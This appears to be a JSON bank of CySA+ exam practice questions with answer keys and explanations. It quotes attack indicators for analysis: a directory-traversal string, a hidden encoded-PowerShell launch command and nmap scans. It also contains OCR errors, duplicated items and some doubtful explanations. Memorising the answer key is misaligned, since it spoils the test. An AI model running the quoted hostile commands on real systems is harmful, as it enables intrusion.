      "B. Communicate the compromised credentials to the user.",
      "C. Perform an ad hoc AV scan on the user's laptop.",
      "D. Review and ensure privileges assigned to the user's account reflect least privilege.",
      "E. Lower the thresholds for SOC alerting of suspected malicious activity."
    ],
    "answer": "A",
    "explanation": "The first and most urgent step to mitigate the impact of compromised credentials on the dark web is\nto perform a forced password reset for the affected user. This will prevent the cybercriminals from\nusing the stolen credentials to access the company’s network and systems. Multifactor\nauthentication is a good security measure, but it is not foolproof and can be bypassed by\nsophisticated attackers. Therefore, changing the password as soon as possible is the best practice to\nreduce the risk of a data breach or other cyber attack123 Reference: 1: How to monitor the dark web\nfor compromised employee credentials 2: How to prevent corporate credentials ending up on the\ndark web 3: Data Breach Prevention: Identifying Leaked Credentials on the Dark Web",
    "image": null
  },
  {
    "id": "q-jc-292",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst is performing an investigation involving multiple targeted Windows malware\nbinaries. The analyst wants to gather intelligence without disclosing information to the attackers.\nWhich of the following actions would allow the analyst to achieve the objective?",
    "options": [
      "A. Upload the binary to an air-gapped sandbox for analysis.",
      "B. Send the binaries to the antivirus vendor.",
      "C. Execute the binaries on an environment with internet connectivity.",
      "D. Query the file hashes using VirusTotal."
    ],
    "answer": "A",
    "explanation": "An air-gapped sandbox is a virtual machine or a physical device that is isolated from any network\nconnection. This allows the analyst to safely execute the malware binaries and observe their\nbehavior without risking any communication with the attackers or any damage to other systems.\nUploading the binary to an air-gapped sandbox is the best option to gather intelligence without\ndisclosing information to the attackers12 Reference: 1: Dynamic Analysis of a Windows Malicious\nSelf-Propagating Binary 2: GitHub - mikesiko/PracticalMalwareAnalysis-Labs: Binaries for the book\nPractical Malware Analysis",
    "image": null
  },
  {
    "id": "q-jc-293",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Which of the following is the most appropriate action a security analyst to take to effectively identify\nthe most security risks associated with a locally hosted server?",
    "options": [
      "A. Run the operating system update tool to apply patches that are missing.",
      "B. Contract an external penetration tester to attempt a brute-force attack.",
      "C. Download a vendor support agent to validate drivers that are installed.",
      "D. Execute a vulnerability scan against the target host."
    ],
    "answer": "D",
    "explanation": "A vulnerability scan is a process of identifying and assessing the security weaknesses of a system or\nnetwork. A vulnerability scan can help a security analyst to effectively identify the most security risks\nassociated with a locally hosted server, such as missing patches, misconfigurations, outdated\nsoftware, or exposed services. A vulnerability scan can also provide recommendations on how to\nremediate the identified vulnerabilities and improve the security posture of the server12 Reference:\n1: What is a Vulnerability Scan? | Definition and Examples 2: Securing a server: risks, challenges and\nbest practices - Vaadata",
    "image": null
  },
  {
    "id": "q-jc-294",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following best explains the importance of communicating with staff regarding the\nofficial public communication plan related to incidents impacting the organization?",
    "options": [
      "A. To establish what information is allowed to be released by designated employees",
      "B. To designate an external public relations firm to represent the organization",
      "C. To ensure that all news media outlets are informed at the same time",
      "D. To define how each employee will be contacted after an event occurs"
    ],
    "answer": "A",
    "explanation": "Communicating with staff about the official public communication plan is important to avoid\nunauthorized or inaccurate disclosure of information that could harm the organization’s reputation,\nsecurity, or legal obligations. It also helps to ensure consistency and clarity of the messages delivered\nto the public and other stakeholders.\nhttps://resources.sei.cmu.edu/asset_files/Handbook/2021_002_001_651819.pdf",
    "image": null
  },
  {
    "id": "q-jc-295",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An employee is no longer able to log in to an account after updating a browser. The employee usually\nhas several tabs open in the browser. Which of the following attacks was most likely performed?",
    "options": [
      "A. RFI",
      "B. LFI",
      "C. CSRF",
      "D. XSS"
    ],
    "answer": "C",
    "explanation": "CSRF is an attack that forces an end user to execute unwanted actions on a web application in which\nthey’re currently authenticated. An attacker may trick the user into clicking a malicious link or\nsubmitting a forged form that performs an action on the user’s behalf, such as changing their\npassword or transferring funds. If the user has several tabs open in the browser, they may not notice\nthe CSRF request or the resulting change in their account. Updating the browser may have cleared\nthe user’s cache or cookies, preventing them from logging in to their account after the CSRF attack.",
    "image": "images/page_233_img_2.jpeg"
  },
  {
    "id": "q-jc-296",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An analyst investigated a website and produced the following:\nWhich of the following syntaxes did the analyst use to discover the application versions on this\nvulnerable website?",
    "options": [
      "A. nmap -sS -T4 -F insecure.org",
      "B. nmap -o insecure.org",
      "C. nmap -sV -T4 -F insecure.org",
      "D. nmap -A insecure.org"
    ],
    "answer": "C",
    "explanation": "The correct nmap command for discovering application versions is `nmap -sV -T4 -F insecure.org` (C). The -sV flag enables Service/Version Detection, which probes open ports to determine the service name and version number (e.g., Apache 2.4.18, OpenSSH 7.9). -T4 sets an aggressive timing template for faster scanning. -F scans only the top 100 common ports. Option A (-sS) performs a SYN stealth scan without version detection. Option B (-o) is not a valid nmap flag. Option D (-A) enables aggressive mode (version + OS detection + scripting + traceroute), which is more intrusive than necessary for just version identification.",
    "image": "images/page_233_img_2.jpeg"
  },
  {
    "id": "q-jc-297",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst scans a host and generates the following output:\nWhich of the following best describes the output?",
    "options": [
      "A. The host is unresponsive to the ICMP request.",
      "B. The host Is running a vulnerable mall server.",
      "C. The host Is allowlng unsecured FTP connectlons.",
      "D. The host is vulnerable to web-based exploits."
    ],
    "answer": "D",
    "explanation": "The output shows that port 80 is open and running an HTTP service, indicating that the host could\npotentially be vulnerable to web-based attacks. The other options are not relevant for this purpose:\nthe host is responsive to the ICMP request, as shown by the “Host is up” message; the host is not\nrunning a mail server, as there is no SMTP or POP3 service detected; the host is not allowing\nunsecured FTP connections, as there is no FTP service detected.\nReference: According to the CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition123, one of the\nobjectives for the exam is to “use appropriate tools and methods to manage, prioritize and respond\nto attacks and vulnerabilities”. The book also covers the usage and syntax of nmap, a popular\nnetwork scanning tool, in chapter 5. Specifically, it explains the meaning and function of each option\nin nmap, such as “-sV” for version detection2, page 195. Therefore, this is a reliable source to verify\nthe answer to the question.",
    "image": "images/page_233_img_2.jpeg"
  },
  {
    "id": "q-jc-298",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst is trying to validate the results of a web application scan with Burp Suite. The\nsecurity analyst performs the following:\nWhich of the following vulnerabilitles Is the securlty analyst trylng to valldate?",
    "options": [
      "A. SQL injection",
      "B. LFI",
      "C. XSS",
      "D. CSRF"
    ],
    "answer": "B",
    "explanation": "The security analyst is validating a Local File Inclusion (LFI) vulnerability, as indicated by the\n“/…/…/…/” in the GET request which is a common indicator of directory traversal attempts\nassociated with LFI. The other options are not relevant for this purpose: SQL injection involves\ninjecting malicious SQL statements into a database query; XSS involves injecting malicious scripts\ninto a web page; CSRF involves tricking a user into performing an unwanted action on a web\napplication.\nReference: According to the CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition1, one of the\nobjectives for the exam is to “use appropriate tools and methods to manage, prioritize and respond\nto attacks and vulnerabilities”. The book also covers the usage and syntax of Burp Suite, a tool used\nfor testing web application security, in chapter 6. Specifically, it explains the meaning and function of\neach component in Burp Suite, such as Repeater, which allows the security analyst to modify and\nresend individual requests1, page 239. Therefore, this is a reliable source to verify the answer to the\nquestion.",
    "image": "images/page_235_img_2.jpeg"
  },
  {
    "id": "q-jc-299",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst has received an incident case regarding malware spreading out of control on a\ncustomer's network. The analyst is unsure how to respond. The configured EDR has automatically\nobtained a sample of the malware and its signature. Which of the following should the analyst\nperform next to determine the type of malware, based on its telemetry?",
    "options": [
      "A. Cross-reference the signature with open-source threat intelligence.",
      "B. Configure the EDR to perform a full scan.",
      "C. Transfer the malware to a sandbox environment.",
      "D. Log in to the affected systems and run necstat."
    ],
    "answer": "A",
    "explanation": "The signature of the malware is a unique identifier that can be used to compare it with known\nmalware samples and their behaviors. Open-source threat intelligence sources provide information\non various types of malware, their indicators of compromise, and their mitigation strategies. By\ncross-referencing the signature with these sources, the analyst can determine the type of malware\nand its telemetry. The other options are not relevant for this purpose: configuring the EDR to perform\na full scan may not provide additional information on the malware type; transferring the malware to\na sandbox environment may expose the analyst to further risks; logging in to the affected systems\nand running netstat may not reveal the malware activity.\nReference: According to the CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition1, one of the\nobjectives for the exam is to “use appropriate tools and methods to manage, prioritize and respond\nto attacks and vulnerabilities”. The book also covers the usage and syntax of EDR, a tool used for\nendpoint security, in chapter 5. Specifically, it explains the meaning and function of malware\nsignatures and how they can be used to identify malware types1, page 203. It also discusses the\nbenefits and challenges of using open-source threat intelligence sources to enhance security\nanalysis1, page 211. Therefore, this is a reliable source to verify the answer to the question.",
    "image": null
  },
  {
    "id": "q-jc-300",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "While reviewing the web server logs, a security analyst notices the following snippet:\n.. \\ .. / .. \\ .. /boot.ini\nWhich of the following Is belng attempted?",
    "options": [
      "A. Directory traversal",
      "B. Remote file inclusion",
      "C. Cross-site scripting",
      "D. Remote code execution",
      "E. Enumeration of /etc/passwd"
    ],
    "answer": "A",
    "explanation": "The snippet shows an attempt to access the boot.ini file, which is a configuration file for Windows\noperating systems. The “… \\ … /” pattern is used to navigate up the directory structure and reach the\nroot directory, where the boot.ini file is located. This is a common technique for exploiting directory\ntraversal vulnerabilities, which allow an attacker to access files and directories outside the intended\nweb server path. The other options are not relevant for this purpose: remote file inclusion involves\ninjecting a malicious file into a web application; cross-site scripting involves injecting malicious\nscripts into a web page; remote code execution involves executing arbitrary commands on a remote\nsystem; enumeration of /etc/passwd involves accessing the file that stores user information on Linux\nsystems.\nReference: According to the CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition1, one of the\nobjectives for the exam is to “use appropriate tools and methods to manage, prioritize and respond\nto attacks and vulnerabilities”. The book also covers the usage and syntax of web server logs, which\nrecord the requests and responses of web applications, in chapter 6. Specifically, it explains the\nmeaning and function of each component in web server logs, such as the HTTP method, the URL, the\nstatus code, and the user agent1, page 244. It also discusses the common types and indicators of\nweb-based attacks, such as directory traversal, which use special characters to manipulate the web\nserver path1, page 251. Therefore, this is a reliable source to verify the answer to the question.",
    "image": null
  },
  {
    "id": "q-jc-301",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "The Chief Information Security Officer (CISO) of a large management firm has selected a\ncybersecurity framework that will help the organization demonstrate its investment in tools and\nsystems to protect its dat\na. Which of the following did the CISO most likely select?",
    "options": [
      "A. PCI DSS",
      "B. COBIT",
      "C. ISO 27001",
      "D. ITIL"
    ],
    "answer": "C",
    "explanation": "ISO 27001 is an international standard that establishes a framework for implementing, maintaining,\nand improving an information security management system (ISMS). It helps organizations\ndemonstrate their commitment to protecting their data and complying with various regulations and\nbest practices. The other options are not relevant for this purpose: PCI DSS is a standard that focuses\non protecting payment card data; COBIT is a framework that provides guidance on governance and\nmanagement of enterprise IT; ITIL is a framework that provides guidance on service management\nand delivery.\nReference: According to the CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition1, one of the\nobjectives for the exam is to “use appropriate tools and methods to manage, prioritize and respond\nto attacks and vulnerabilities”. The book also covers the usage and syntax of various cybersecurity\nframeworks and standards, such as ISO 27001, PCI DSS, COBIT, and ITIL, in chapter 1. Specifically, it\nexplains the meaning and function of each framework and standard, such as ISO 27001, which\nprovides a comprehensive approach to information security management1, page 29. Therefore, this\nis a reliable source to verify the answer to the question.",
    "image": null
  },
  {
    "id": "q-jc-302",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst has prepared a vulnerability scan that contains all of the company's functional\nsubnets. During the initial scan, users reported that network printers began to print pages that\ncontained unreadable text and icons.\nWhich of the following should the analyst do to ensure this behavior does not oocur during\nsubsequent vulnerability scans?",
    "options": [
      "A. Perform non-credentialed scans.",
      "B. Ignore embedded web server ports.",
      "C. Create a tailored scan for the printer subnet.",
      "D. Increase the threshold length of the scan timeout."
    ],
    "answer": "C",
    "explanation": "The best way to prevent network printers from printing pages during a vulnerability scan is to create\na tailored scan for the printer subnet that excludes the ports and services that trigger the printing\nbehavior. The other options are not effective for this purpose: performing non-credentialed scans\nmay not reduce the impact on the printers; ignoring embedded web server ports may not cover all\nthe possible ports that cause printing; increasing the threshold length of the scan timeout may not\nprevent the printing from occurring.\nReference: According to the CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition1, one of the\nobjectives for the exam is to “use appropriate tools and methods to manage, prioritize and respond\nto attacks and vulnerabilities”. The book also covers the usage and syntax of vulnerability scanning\ntools, such as Nessus, Nmap, and Qualys, in chapter 4. Specifically, it explains the meaning and\nfunction of each component in vulnerability scanning, such as credentialed vs. non-credentialed\nscans, port scanning, and scan scheduling1, pages 149-160. It also discusses the common issues and\nchallenges of vulnerability scanning, such as network disruptions, false positives, and scan scope1,\npages 161-162. Therefore, this is a reliable source to verify the answer to the question.",
    "image": null
  },
  {
    "id": "q-jc-303",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A vulnerability analyst is writing a report documenting the newest, most critical vulnerabilities\nidentified in the past month. Which of the following public MITRE repositories would be best to\nreview?",
    "options": [
      "A. Cyber Threat Intelligence",
      "B. Common Vulnerabilities and Exposures",
      "C. Cyber Analytics Repository",
      "D. ATT&CK"
    ],
    "answer": "B",
    "explanation": "The Common Vulnerabilities and Exposures (CVE) is a public repository of standardized identifiers\nand descriptions for common cybersecurity vulnerabilities. It helps security analysts to identify,\nprioritize, and report on the most critical vulnerabilities in their systems and applications. The other\noptions are not relevant for this purpose: Cyber Threat Intelligence (CTI) is a collection of information\nand analysis on current and emerging cyber threats; Cyber Analytics Repository (CAR) is a knowledge\nbase of analytics developed by MITRE based on the ATT&CK adversary model; ATT&CK is a globally-\naccessible knowledge base of adversary tactics and techniques based on real-world observations.\nReference: According to the CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition1, one of the\nobjectives for the exam is to “use appropriate tools and methods to manage, prioritize and respond\nto attacks and vulnerabilities”. The book also covers the usage and syntax of various cybersecurity\nframeworks and standards, such as CVE, CTI, CAR, and ATT&CK, in chapter 1. Specifically, it explains\nthe meaning and function of each framework and standard, such as CVE, which provides a common\nlanguage for describing and sharing information about vulnerabilities1, page 28. Therefore, this is a\nreliable source to verify the answer to the question.",
    "image": null
  },
  {
    "id": "q-jc-304",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An MSSP received several alerts from customer 1, which caused a missed incident response deadline\nfor customer 2. Which of the following best describes the document that was violated?",
    "options": [
      "A. KPI",
      "B. SLO",
      "C. SLA",
      "D. MOU"
    ],
    "answer": "C",
    "explanation": "An SLA, or Service Level Agreement, is a contract between a service provider and its customers that\ndocuments what services the provider will furnish and defines the service standards the provider is\nobligated to meet. In the scenario described, the missed incident response deadline is a clear\nindicator of an SLA violation. An SLA usually outlines the metrics by which service is measured as\nwell as remedies or penalties should agreed-upon service levels not be achieved. Unlike a KPI (Key\nPerformance Indicator) which is a quantifiable measure used to evaluate the success of an\norganization, employee, etc., in meeting objectives for performance, or an MOU (Memorandum of\nUnderstanding) which is a formal agreement between two or more parties, an SLA is focused on the\nperformance and quality metrics applicable to the service provided. SLO (Service Level Objective) is\nrelated and often part of an SLA, representing the specific measurable characteristics of the SLA such\nas availability, throughput, frequency, response time, or quality.",
    "image": null
  },
  {
    "id": "q-jc-305",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A high volume of failed RDP authentication attempts was logged on a critical server within a one-\nhour period. All of the attempts originated from the same remote IP address and made use of a\nsingle valid domain user account. Which of the following would be the most effective mitigating\ncontrol to reduce the rate of success of this brute-force attack?",
    "options": [
      "A. Enabling a user account lockout after a limited number of failed attempts",
      "B. Installing a third-party remote access tool and disabling RDP on all devices",
      "C. Implementing a firewall block for the remote system's IP address",
      "D. Increasing the verbosity of log-on event auditing on all devices"
    ],
    "answer": "A",
    "explanation": "Enabling a user account lockout policy is a security measure that can effectively mitigate brute-force\nattacks. After a predetermined number of consecutive failed login attempts, the account will be\nlocked, preventing the attacker from continuing to try different password combinations. This control\ndirectly addresses the issue of multiple failed attempts from the same IP address using a single user\naccount, making it the most effective among the options provided. Option B suggests replacing RDP\nwith another remote access tool, which does not address the brute-force attempt but rather avoids\nthe RDP protocol. Option C, implementing a firewall block, could be effective but does not prevent\nattacks from other IP addresses and may not be as immediate. Option D, increasing log verbosity,\nenhances monitoring but does not prevent the attack itself.",
    "image": null
  },
  {
    "id": "q-jc-306",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An analyst is investigating a phishing incident and has retrieved the following as part of the\ninvestigation:\ncmd.exe /c c:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden -\nExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand <VERY LONG STRING>\nWhich of the following should the analyst use to gather more information about the purpose of this\ncommand?",
    "options": [
      "A. Echo the command payload content into 'base64 -d'.",
      "B. Execute the command from a Windows VM.",
      "C. Use a command console with administrator privileges to execute the code.",
      "D. Run the command as an unprivileged user from the analyst workstation."
    ],
    "answer": "A",
    "explanation": "The command in question involves an encoded PowerShell command, which is typically used by\nattackers to obfuscate malicious scripts. To decode and understand the payload, one would need to\ndecode the base64 encoded string. This is why option A is the correct answer, as 'base64 -d' is a\ncommand used to decode data encoded with base64. This process will reveal the plaintext of the\nencoded command, which can then be analyzed to understand the actions that the attacker was\nattempting to perform. Option B is risky and not advised without a controlled and isolated\nenvironment. Option C is not safe because executing unknown or suspicious code with administrator\nprivileges could cause harm to the system or network. Option D also poses a risk of executing\npotentially harmful code on an analyst’s workstation.",
    "image": "images/page_244_img_2.jpeg"
  },
  {
    "id": "q-jc-307",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "The security team at a company, which was a recent target of ransomware, compiled a list of hosts\nthat were identified as impacted and in scope for this incident. Based on the following host list:\nWhich of the following systems was most pivotal to the threat actor in its distribution of the\nencryption binary via Group Policy?",
    "options": [
      "A. SQL01",
      "B. WK10-Sales07",
      "C. WK7-Plant01",
      "D. DCEast01",
      "E. HQAdmin9"
    ],
    "answer": "D",
    "explanation": "Based on the list of hosts and their functions, DCEast01, which is a Domain Controller, would be the\nmost pivotal in the distribution of an encryption binary via Group Policy. Domain Controllers are\nresponsible for security and administrative policies within a Windows Domain. Group Policy is a\nfeature of Windows that facilitates a wide range of advanced settings that administrators can use to\ncontrol the working environment of user accounts and computer accounts. Group Policy can be used\nto deploy software, which in this case would be the encryption binary of the ransomware. SQL01 is a\ndatabase server and unlikely to be used for this purpose. WK10-Sales07 and WK7-Plant01 are client\nmachines, and HQAdmin9, although it is a network admin laptop, would not typically be used to\ndistribute policies across a network.",
    "image": "images/page_244_img_2.jpeg"
  },
  {
    "id": "q-jc-308",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Several reports with sensitive information are being disclosed via file sharing services. The company\nwould like to improve its security posture against this threat. Which of the following security controls\nwould best support the company in this scenario?",
    "options": [
      "A. Implement step-up authentication for administrators.",
      "B. Improve employee training and awareness.",
      "C. Increase password complexity standards.",
      "D. Deploy mobile device management."
    ],
    "answer": "B",
    "explanation": "Improving employee training and awareness is the best option to address the issue of sensitive\nreports being disclosed via file sharing services. By educating employees about the risks of\nunapproved file sharing, the security protocols to follow, and the proper channels to use for sharing\ncompany information, an organization can significantly reduce the risk of sensitive data being\naccidentally or intentionally shared on insecure platforms. This human-centric approach addresses\nthe root cause of the problem. Options A, C, and D are security controls that do not directly address\nthe behavior of sharing sensitive files on unauthorized services.",
    "image": "images/page_244_img_2.jpeg"
  },
  {
    "id": "q-jc-309",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following best describes the key goal of the containment stage of an incident response\nprocess?",
    "options": [
      "A. To limit further damage from occurring",
      "B. To get services back up and running",
      "C. To communicate goals and objectives of the\nincident\nresponse plan",
      "D. To prevent data follow-on actions by adversary exfiltration"
    ],
    "answer": "A",
    "explanation": "The key goal of the containment stage in an incident response process is to limit further damage\nfrom occurring. This involves taking immediate steps to isolate the affected systems or network\nsegments to prevent the spread of the incident and mitigate its impact. Containment strategies can\nbe short-term, to quickly stop the incident, or long-term, to prepare for the eradication and recovery\nphases.",
    "image": null
  },
  {
    "id": "q-jc-310",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "During a tabletop exercise, engineers discovered that an ICS could not be updated due to hardware\nversioning incompatibility. Which of the following is the most likely cause of this issue?",
    "options": [
      "A. Legacy system",
      "B. Business process interruption",
      "C. Degrading functionality",
      "D. Configuration management"
    ],
    "answer": "A",
    "explanation": "The most likely cause of the issue where an ICS (Industrial Control System) could not be updated due\nto hardware versioning incompatibility is a legacy system. Legacy systems often have outdated\nhardware and software that may not be compatible with modern updates and patches. This can pose\nsignificant challenges in maintaining security and operational efficiency.",
    "image": null
  },
  {
    "id": "q-jc-311",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An analyst investigated a website and produced the following:\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 10:21 CDT\nNmap scan report for insecure.org (45.33.49.119)\nHost is up (0.054s latency).\nrDNS record for 45.33.49.119: ack.nmap.org\nNot shown: 95 filtered tcp ports (no-response)\nPORT STATE SERVICE VERSION\n22/tcp open ssh OpenSSH 7.4 (protocol 2.0)\n25/tcp closed smtp\n80/tcp open http Apache httpd 2.4.6\n113/tcp closed ident\n443/tcp open ssl/http Apache httpd 2.4.6\nService Info: Host: issues.nmap.org\nService detection performed. Please report any incorrect results at https://nmap .org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 20.52 seconds\nWhich of the following syntaxes did the analyst use to discover the application versions on this\nvulnerable website?",
    "options": [
      "A. nmap\n-sS -T4 -F insecure.org",
      "B. nmap\n-0 insecure.org",
      "C. nmap\n-sV -T4 -F insecure.org",
      "D. nmap\n-A insecure.org"
    ],
    "answer": "C",
    "explanation": "The analyst used the command nmap -sV -T4 -F insecure.org to discover the application versions on\nthe vulnerable website. The -sV option in Nmap is used to perform version detection, which\nidentifies the versions of the services running on open ports. The -T4 option sets the timing template\nfor faster execution, and -F scans only the most common ports.",
    "image": null
  },
  {
    "id": "q-jc-312",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An MSSP received several alerts from customer 1, which caused a missed incident response deadline\nfor customer 2. Which of the following best describes the document that was violated?",
    "options": [
      "A. KPI",
      "B. SLO",
      "C. SLA",
      "D. MOU"
    ],
    "answer": "C",
    "explanation": "The document that was violated in this scenario is the SLA (Service Level Agreement). An SLA is a\nformal agreement between a service provider and a customer that defines the level of service\nexpected. It includes specific metrics such as response times and resolution times. Missing an\nincident response deadline for customer 2 due to alerts from customer 1 indicates a breach of the\nagreed-upon service levels outlined in the SLA.",
    "image": null
  },
  {
    "id": "q-jc-313",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Results of a SOC customer service evaluation indicate high levels of dissatisfaction with the\ninconsistent services provided after regular work hours. To address this, the SOC lead drafts a\ndocument establishing customer expectations regarding the SOC's performance and quality of\nservices. Which of the following documents most likely fits this description?",
    "options": [
      "A. Risk management plan",
      "B. Vendor agreement",
      "C. Incident response plan",
      "D. Service-level agreement"
    ],
    "answer": "D",
    "explanation": "A Service-Level Agreement (SLA) is a document that establishes customer expectations regarding the\nperformance and quality of services provided by the SOC (Security Operations Center). It defines the\nlevel of service expected, including aspects like response times, availability, and support after regular\nwork hours. An SLA helps in setting clear expectations and improving customer satisfaction by\noutlining the standards and commitments of the service provider.",
    "image": null
  },
  {
    "id": "q-jc-314",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A cybersecurity analyst has been assigned to the threat-hunting team to create a dynamic detection\nstrategy based on behavioral analysis and attack patterns. Which of the following best describes\nwhat the analyst will be creating?",
    "options": [
      "A. Bots",
      "B. loCs",
      "C. TTPs",
      "D. Signatures"
    ],
    "answer": "C",
    "explanation": "The analyst will be creating TTPs (Tactics, Techniques, and Procedures). TTPs describe the behavior,\nmethods, and patterns used by attackers during a cyber attack. By focusing on TTPs, the analyst can\ndevelop a dynamic detection strategy that identifies malicious activities based on the observed\nbehavior and patterns, rather than relying on static indicators like signatures or IOCs (Indicators of\nCompromise).",
    "image": null
  },
  {
    "id": "q-jc-315",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A development team is preparing to roll out a beta version of a web application and wants to quickly\ntest for vulnerabilities, including SQL injection, path traversal, and cross-site scripting. Which of the\nfollowing tools would the security team most likely recommend to perform this test?",
    "options": [
      "A. Has heat",
      "B. OpenVAS",
      "C. OWASP ZAP",
      "D. Nmap"
    ],
    "answer": "C",
    "explanation": "OWASP ZAP (Zed Attack Proxy) is a tool recommended for quickly testing web applications for\nvulnerabilities, including SQL injection, path traversal, and cross-site scripting. It is an open-source\nweb application security scanner that helps identify security issues in web applications during the\ndevelopment and testing phases.",
    "image": null
  },
  {
    "id": "q-jc-316",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An organization has a critical financial application hosted online that does not allow event logging to\nsend to the corporate SIEM. Which of the following is the best option for the security analyst to\nconfigure to improve the efficiency of security operations?",
    "options": [
      "A. Configure a new SIEM specific to the management of the hosted environment.",
      "B. Subscribe to a threat feed related to the vendor's application.",
      "C. Use a vendor-provided API to automate pulling the logs in real time.",
      "D. Download and manually import the logs outside of business hours."
    ],
    "answer": "C",
    "explanation": "Using a vendor-provided API to automate pulling logs in real-time is the best option for improving\nthe efficiency of security operations when the financial application does not allow event logging to\nsend to the corporate SIEM. This approach ensures that logs are consistently and promptly\nintegrated into the security monitoring process without manual intervention, enhancing the overall\neffectiveness of security operations.",
    "image": null
  },
  {
    "id": "q-jc-317",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following will most likely cause severe issues with authentication and logging?",
    "options": [
      "A. Virtualization",
      "B. Multifactor authentication",
      "C. Federation",
      "D. Time synchronization"
    ],
    "answer": "D",
    "explanation": "Time synchronization issues can cause severe problems with authentication and logging. If system\nclocks are not properly synchronized, it can lead to discrepancies in log timestamps, making it\ndifficult to correlate events across different systems. Additionally, time-related discrepancies can\naffect authentication mechanisms that rely on time-based tokens, such as those used in multifactor\nauthentication, leading to failures and security gaps.",
    "image": null
  },
  {
    "id": "q-jc-318",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A list of loCs released by a government security organization contains the SHA-256 hash for a\nMicrosoft-signed legitimate binary, svchost. exe. Which of the following best describes the result if\nsecurity teams add this indicator to their detection signatures?",
    "options": [
      "A. This indicator would fire on the majority of Windows devices.",
      "B. Malicious files with a matching hash would be detected.",
      "C. Security teams would detect rogue svchost. exe processes\nin\ntheir\nenvironment.",
      "D. Security teams would detect event entries detailing executionof\nknown-malicious\nsvchost. exe processes."
    ],
    "answer": "A",
    "explanation": "Adding the SHA-256 hash of a legitimate Microsoft-signed binary like svchost.exe to detection\nsignatures would result in the indicator firing on the majority of Windows devices. Svchost.exe is a\ncommon and legitimate system process used by Windows, and using its hash as an indicator of\ncompromise (IOC) would generate numerous false positives, as it would match the legitimate\ninstances of svchost.exe running on all Windows systems.",
    "image": null
  },
  {
    "id": "q-jc-319",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "The Chief Information Security Officer (CISO) of a large management firm has selected a\ncybersecurity framework that will help the organization demonstrate its investment in tools and\nsystems to protect its dat\na. Which of the following did the CISO most likely select?",
    "options": [
      "A. PCI DSS",
      "B. COBIT",
      "C. ISO 27001",
      "D. ITIL"
    ],
    "answer": "C",
    "explanation": "The Chief Information Security Officer (CISO) most likely selected ISO 27001, a widely recognized\ncybersecurity framework that helps organizations establish, implement, maintain, and continuously\nimprove an information security management system (ISMS). ISO 27001 is designed to help\norganizations manage the security of assets such as financial information, intellectual property,\nemployee details, and information entrusted by third parties, demonstrating a commitment to data\nprotection and security.",
    "image": null
  },
  {
    "id": "q-jc-320",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
